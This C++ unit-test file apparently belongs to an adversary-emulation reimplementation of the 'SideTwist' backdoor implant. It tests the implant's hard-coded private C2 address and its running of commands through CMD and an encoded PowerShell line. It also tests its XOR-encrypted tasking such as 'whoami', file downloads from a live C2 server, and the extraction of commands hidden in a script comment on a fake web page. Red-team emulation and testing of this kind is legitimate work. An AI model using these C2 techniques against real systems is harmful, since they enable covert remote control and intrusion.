#include "pch.h"
#include "gmock/gmock.h"
#include "..\SideTwist\include\SideTwist.h"
#include "..\SideTwist\src\SideTwist.cpp"
#include "..\SideTwist\src\comms.cpp"
#include "..\SideTwist\src\parser.cpp"
#include "..\SideTwist\src\base64.cpp"

using ::testing::HasSubstr;

struct SideTwistTest : testing::Test
{
	SideTwist* stTest;
	SideTwistTest()
	{
		stTest = new SideTwist;
	}

	~SideTwistTest()
	{
		delete stTest;
	}
};

struct StCommsTest : testing::Test
{
	StComms* stCommsTest;
	StCommsTest()
	{
		stCommsTest = new StComms(std::string("UNCW"), std::string("192.168.0.4"), (int)443);
	}

	~StCommsTest()
	{
		delete stCommsTest;
	}
};

// Test length of generated ID (contents vary by user/computer)
TEST_F(SideTwistTest, GetID) {
	ASSERT_EQ(stTest->getID().length(), 4);
}

// Test hard-coded address and port
TEST_F(SideTwistTest, GetDefaultAddressAndPort) {
	EXPECT_EQ(stTest->getAddressAndPort(), "192.168.0.4:443");
}

// Test address and port
TEST_F(SideTwistTest, ChangeDefaultAddressAndPort) {
	EXPECT_TRUE(stTest->setIPAddress("192.168.0.5"));
	EXPECT_TRUE(stTest->setPort("555"));
	EXPECT_EQ(stTest->getAddressAndPort(), "192.168.0.5:555");
}

// Supplies a port outside of the acceptable range
TEST_F(SideTwistTest, ChangePortOutOfBounds) {
	EXPECT_FALSE(stTest->setPort("100000"));
}

// Supplies a port outside of the acceptable range
TEST_F(SideTwistTest, ChangePortNaN) {
	EXPECT_FALSE(stTest->setPort("test"));
}

// Tests an initial run of the implant. Expects a default response, no action
TEST_F(SideTwistTest, RunFunction) {
	EXPECT_EQ(stTest->run(), 0);
}

/**
* Presumes a file located at c:\users\public\st_test.txt containing the following:
* "GetFileBytes test data"
*/
TEST_F(SideTwistTest, GetFileBytes) {
	std::string fileBytes;
	stTest->getFileBytes("c:\\users\\public\\st_test.txt", fileBytes);
	EXPECT_EQ(fileBytes, "GetFileBytes test data");
}

/** 
* Without mocking, this can only be run with a live C2 server and the appropriate
* command waiting. For this test, supply: '102 c:\users\public\test.txt|test.txt'
* where the server's "test.txt" is a base64-encoded file (contents don't matter,
* just that it's not empty/plain text).
*/
TEST_F(SideTwistTest, FileDownload) {
	stTest->run();
	EXPECT_TRUE(PathFileExistsW(L"c:\\users\\public\\test.txt"));
}

// Tests command execution with CMD. Expected to be run on the dragon dev machines
TEST_F(SideTwistTest, ExecuteCMDCommand) {
	EXPECT_THAT(stTest->cmdExec("hostname"), HasSubstr("dragon"));
}

// Tests command execution with Powershell. Expected to be run on the dragon dev machines
TEST_F(SideTwistTest, ExecutePSCommand) {
	EXPECT_THAT(stTest->cmdExec("powershell -e JABlAG4AdgA6AGMAbwBtAHAAdQB0AGUAcgBuAGEAbQBlAA=="),
		HasSubstr("dragon"));
}

// Tests the comms parsing method with an instruction to execute command
TEST_F(StCommsTest, TokenizeCmdExecInstruction) {
	std::vector<std::string> truth = {
		std::string("1"),
		std::string("101"),
		std::string("whoami") };
	std::vector<std::string>* pTokens = new std::vector<std::string>;
	std::string data = "XxNFXVQOF1cGGDw5XgQ=";

	stCommsTest->tokenizeResponse(data, pTokens);
	for (int i = 0; i < pTokens->size(); ++i)
	{
		EXPECT_EQ(pTokens->at(i), truth.at(i));
	}
	pTokens->clear();
	delete pTokens;
}

// Tests the comms parsing method with an instruction to download a file
// This requires double parsing
TEST_F(StCommsTest, TokenizeFileDownloadInstruction) {
	std::vector<std::string> truth = {
		std::string("1"),
		std::string("102"),
		std::string("c:\\users\\public\\test.txt"),
		std::string("test.txt")};
	std::vector<std::string>* pTokens = new std::vector<std::string>;
	std::string data = "XxNFXVcOKh8eDQE2IRgOCzwQBiY4DAwoGAc9OiEJDV00Gws8BVUUOzcCDVY/GhAlDUI=";

	stCommsTest->tokenizeResponse(data, pTokens);
	for (int i = 0; i < pTokens->size(); ++i)
	{
		EXPECT_EQ(pTokens->at(i), truth.at(i));
	}
	pTokens->clear();
	delete pTokens;
}

// Tests decryption for a simple task
TEST_F(StCommsTest, TestDecryption) {
	std::string encrypted{ 0x5f, 0x13, 0x45, 0x5d, 0x54, 0x0e, 0x04, 0x0d, 0x01, 0x0f, 0x08, 0x07 };
	stCommsTest->decrypt(encrypted);
	EXPECT_EQ(encrypted, "1|101|whoami");
}

// Tests encryption for a simple task response
TEST_F(StCommsTest, TestEncryption) {
	std::string plain = "dragon0";
	std::string encrypted{ 0x0a, 0x1d, 0x15, 0x0a, 0x0a, 0x1c, 0x43 };
	stCommsTest->encrypt(plain);
	EXPECT_EQ(plain, encrypted);
}


// Ensure an appropriate JSON dict is returned
TEST_F(StCommsTest, PrepareResponseString) {
	std::string index = "1";
	std::string taskResult = "dragon0";
	std::string respString;
	stCommsTest->prepareTaskResponse(respString, index, taskResult);
	EXPECT_EQ(respString, "{\"1\":\"Ch0VCgocQw==\"}");
}

// Tests the parser directly, splitting on pipe
TEST(Parser, SplitOnPipe) {
	std::vector<std::string> truth = { 
		std::string("1"), 
		std::string("101"),
		std::string("instruction") };
	std::vector<std::string>* pTokens = new std::vector<std::string>;
	std::string data = "1|101|instruction";

	splitOnPipe(data, pTokens);
	for (int i = 0; i < pTokens->size(); ++i)
	{
		EXPECT_EQ(pTokens->at(i), truth.at(i));
	}
	pTokens->clear();
	delete pTokens;
}

TEST(Parser, ParseHTML) {
	std::string HTML =
		"<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \
		\"http://www.w3.org/TR/html4/strict.dtd\"> \
		<html lang = \"en-us\" class = \"styleguide yui3-js-enabled\" \
		id = \"yui_3_11_0_1_1646155177741_261\"> \
		<div id = \"yui3-css-stamp\" style = \"position: absolute !important; \
		visibility: hidden !important\" class = \"\"></div> \
		<body class = \"zeus new-footer new-header super-liquid extras quirks en-us liquid\" \
		id = \"yui_3_11_0_1_1646155177741_260\" style = \"margin: 0px;\"> \
		<div class = \"wipe-msg\" style = \"font-size:12px;text-align:left;\" \
		id = \"yui_3_11_0_1_1646155177741_267\"><div style = \"margin-bottom:3px;\"> \
		<img alt = \"NotFlickr\" width = \"162\" src = \"/logo.png\"></div> \
		<script>/*MTAxfGlkfGluc3RydWN0aW9uCg==*/</script> \
		<div style=\"padding-left:5px;line-height:1.2em;\" id=\"yui_3_11_0_1_1646155177741_266\"> \
		We're sorry, NotFlickr does not allow embedding within frames. \
		<br><br>If you'd like to view this content, <a href=\".\" target=\"_top\">please click here</a>. \
		</div></div></body></html>";
	parseHTML(HTML);
	EXPECT_EQ(HTML, "MTAxfGlkfGluc3RydWN0aW9uCg==");
}



int main(int argc, char** argv) {
	testing::InitGoogleTest(&argc, argv);
	return RUN_ALL_TESTS();
}